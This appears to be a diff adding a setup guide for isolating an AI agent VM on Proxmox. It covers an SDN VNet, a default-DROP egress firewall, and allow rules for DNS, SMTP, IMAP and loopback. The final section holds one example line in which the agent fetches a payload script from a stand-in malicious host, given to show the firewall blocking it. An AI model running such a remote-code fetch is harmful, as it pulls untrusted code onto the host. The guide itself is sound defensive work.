@@ -1,0 +1,93 @@
+Project Intern: Network Segmentation & Egress Control
+
+📌 Rationale
+To prevent the agent from executing malicious network commands (e.g., unauthorized data exfiltration, downloading unverified Python packages, or scanning the local LAN), we utilize Proxmox's Software-Defined Network (SDN) and Datacenter Firewall. The agent will reside on a completely isolated Virtual Network (VNet) with a Default DROP egress policy.
+
+Phase 1: Creating the Isolated VNet (SDN)
+Instead of attaching the agent's KVM Virtual Machine directly to the default vmbr0 (your physical home network), we create an isolated zone.
+
+Create an SDN Zone:
+
+Go to Datacenter > SDN > Zones.
+
+Add a Simple zone named intern_zone.
+
+Create the VNet:
+
+Go to Datacenter > SDN > VNets.
+
+Create a VNet named vnet_ai and assign it to intern_zone.
+
+Assign the Subnet:
+
+Select vnet_ai, go to Subnets, and create 10.10.0.0/24.
+
+Disable SNAT (Source NAT) to ensure the VNet has no default routed path to the internet.
+
+VM Attachment:
+
+In the hardware settings for VM-AGT-01, set the Network Device (net0) to use the vnet_ai bridge instead of vmbr0.
+
+Phase 2: Activating the Proxmox Firewall
+Proxmox's firewall must be enabled at the Datacenter, Node, and VM levels to take effect.
+
+Datacenter Level: Go to Datacenter > Firewall > Options. Set Enable: Yes.
+
+Node Level: Go to Node (SRV-PRX-01) > Firewall > Options. Set Enable: Yes.
+
+VM Level: Go to VM-AGT-01 > Firewall > Options.
+
+Set Enable: Yes.
+
+Set Default-Action (IN): DROP.
+
+Set Default-Action (OUT): DROP. (This is the critical kill-switch. Nothing leaves the VM without our explicit permission).
+
+Phase 3: The Explicit ALLOW Rules (VM-AGT-01)
+Since the default OUT action is DROP, the intern currently has no network access at all. We must explicitly poke pinholes for its required services.
+
+Note: Because Tailscale creates its own encrypted tailscale0 virtual interface inside the VM, your remote SSH access bypasses these Proxmox firewall rules automatically. Proxmox is only filtering the net0 interface.
+
+Go to VM-AGT-01 > Firewall and add the following rules. Order matters (process top to bottom).
+
+Rule 1: Allow DNS Resolution (Crucial!)
+Without this, the intern cannot resolve smtp.gmail.com to an IP address.
+
+Direction: OUT
+
+Action: ACCEPT
+
+Protocol: UDP
+
+Destination Port: 53 (Point this specifically to your preferred trusted DNS, e.g., 8.8.8.8 or 1.1.1.1).
+
+Rule 2: Allow SMTP (Sending Emails)
+
+Direction: OUT
+
+Action: ACCEPT
+
+Protocol: TCP
+
+Destination Port: 465
+
+Rule 3: Allow IMAP (Reading Inbox)
+
+Direction: OUT
+
+Action: ACCEPT
+
+Protocol: TCP
+
+Destination Port: 993
+
+Rule 4: Allow Internal Localhost Routing (Ollama / LiteLLM)
+
+Direction: IN & OUT (Create two rules)
+
+Action: ACCEPT
+
+Interface: lo (Local loopback is required for smolagents to talk to port 4000/11434).
+
+🛡️ The Resulting Posture
+If the intern hallucinates a requests.get('http://malicious-site.com/payload.py') command inside its Docker execution environment, the packets will hit the net0 interface, fail to match Rules 1-4, and be silently dropped by the hypervisor before ever reaching your physical router.
